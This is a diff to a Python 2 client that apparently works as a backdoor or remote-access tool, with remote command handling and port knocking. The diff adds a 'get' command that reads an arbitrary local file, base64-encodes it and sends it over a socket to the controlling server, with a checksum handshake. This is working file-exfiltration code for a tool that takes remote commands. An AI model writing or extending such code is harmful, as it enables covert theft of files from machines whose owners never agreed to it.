@@ -103,6 +103,37 @@ def upload(cmd, socket_connection):
 		socket_connection.send('saved')
 		print 'File saved to: %s' % path
 
+def get(orig_cmd, socket_connection):
+	"""
+	upload a file to the server
+	:param orig_cmd: the original cmd
+	:param socket_connection: a socket connection with the server
+	"""
+
+	local_path = orig_cmd.split()[1]
+
+	with open(local_path, 'rb') as local_file:
+		enc_file = base64.b64encode(local_file.read())
+		
+		# ask server to enter ready states
+		md5 = hashlib.md5()
+		md5.update(enc_file)
+		socket_connection.send(md5.hexdigest())
+		
+		wait = socket_connection.recv(1024)
+		if wait != 'ready':
+			print '[*ERROR] Expected %s but received %s' % ('ready', wait)
+			return
+
+		socket_connection.send(enc_file)
+		socket_connection.send('\ndone')
+		
+		wait = socket_connection.recv(1024)
+		if wait != 'saved':
+			print '[*ERROR] Expected %s but received %s' % ('saved', wait)
+			return
+
+
 def run_cmd(cmd, socket_connection):
 	""" 
 	runs the command specified by cmd and returns the output 
@@ -123,6 +154,8 @@ def run_cmd(cmd, socket_connection):
 		return shutdown_client(socket_connection)
 	elif cmd.split()[0] == 'upload':
 		return upload(cmd, socket_connection)
+	elif cmd.split()[0] == 'get':
+		return get(cmd, socket_connection)
 	return False
 
 def knock(ip, ports, func):
